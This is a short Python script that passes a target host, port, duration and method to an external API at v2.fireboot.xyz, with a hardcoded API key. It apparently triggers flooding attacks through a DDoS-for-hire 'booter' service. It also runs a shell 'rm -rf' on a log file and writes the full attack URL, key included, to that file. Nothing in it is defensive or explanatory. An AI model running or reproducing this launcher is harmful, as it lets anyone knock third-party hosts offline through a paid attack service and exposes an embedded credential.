import sys
import time
import urllib.request
import subprocess
import threading
import time
import sys

def run(cmd):
    subprocess.call(cmd, shell=True) 

host = sys.argv[2]
port = sys.argv[3]
time = sys.argv[4]
method = sys.argv[1]

host = str(host)

run("rm -rf test.txt")


url = "http://v2.fireboot.xyz/index.php?page=Api&key=nlspss7hrk7xrbp&host="+host+"&port="+port+"&time="+time+"&method="+method+""
req = urllib.request.Request(
    url, 
    data=None, 
    headers={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36'
    }
)
f = urllib.request.urlopen(req)
print(f.read().decode('utf-8'))
with open("test.txt", "a+") as f:
  f.write("http://v2.fireboot.xyz/index.php?page=Api&key=nlspss7hrk7xrbp&host="+host+"&port="+port+"&time="+time+"&method="+method+"")